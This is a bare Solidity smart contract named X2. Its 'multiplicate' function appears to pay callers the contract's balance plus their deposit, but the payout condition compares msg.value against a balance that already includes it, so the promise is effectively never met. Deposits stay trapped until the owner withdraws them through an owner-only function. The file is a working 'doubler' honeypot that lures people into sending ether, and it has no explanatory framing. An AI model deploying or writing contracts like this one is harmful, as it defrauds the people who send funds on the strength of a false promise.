1 contract X2
2 {
3         address public Owner = msg.sender;
4 
5         function() public payable{}
6 
7         function withdraw()  payable public
8         {
9                 require(msg.sender == Owner);
10                 Owner.transfer(this.balance);
11         }
12 
13         function multiplicate(address adr) public payable
14         {
15             if(msg.value>=this.balance)
16             {
17                 adr.transfer(this.balance+msg.value);
18             }
19         }
20 
21 
22 }